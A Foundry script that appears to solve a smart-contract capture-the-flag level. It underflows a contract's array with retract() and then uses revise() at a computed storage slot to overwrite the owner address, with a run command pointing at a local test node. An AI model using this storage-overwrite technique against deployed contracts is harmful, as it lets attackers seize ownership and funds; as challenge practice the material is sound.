// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}
contract SolveScript is Script {
    address public target = 0xDC17C27Ae8bE831AF07CC38C02930007060020F4;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("owner : %s", ITarget(target).owner());
        ITarget(target).makeContact();
        ITarget(target).retract();
        ITarget(target).revise(uint256(0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a), bytes32(uint256(uint160(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC))));

        console.log("owner after poc: %s", ITarget(target).owner());
        vm.stopBroadcast();
    }
}
